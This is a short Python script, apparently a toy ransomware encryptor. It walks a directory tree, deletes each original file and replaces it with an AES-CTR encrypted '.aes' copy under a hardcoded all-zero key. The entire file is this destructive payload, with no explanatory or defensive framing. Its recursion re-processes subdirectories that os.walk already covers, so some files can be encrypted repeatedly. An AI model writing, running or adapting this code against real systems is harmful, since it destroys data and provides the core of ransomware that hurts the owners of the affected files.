import os
import pyaes

key = b"0000000000000000"
aes = pyaes.AESModeOfOperationCTR(key)

def traverse(root_dir):
  print('traversing: ' + root_dir)
  for path, subdirs, files in os.walk(root_dir):
    for subdir in subdirs:
      print('traversing subdir: ' + root_dir)
      traverse(os.path.join(path, subdir))
    for f in files:
      print('found file: ' + f)
      filepath = os.path.join(path, f)
      file = open(filepath, "rb")
      contents = file.read()
      file.close()

      os.remove(filepath)

      out = open(f"{filepath + '.aes'}", "wb")
      print('writing encrypted contents for ' + f)
      out.write(aes.encrypt(contents))
      out.close()

traverse('test_root')
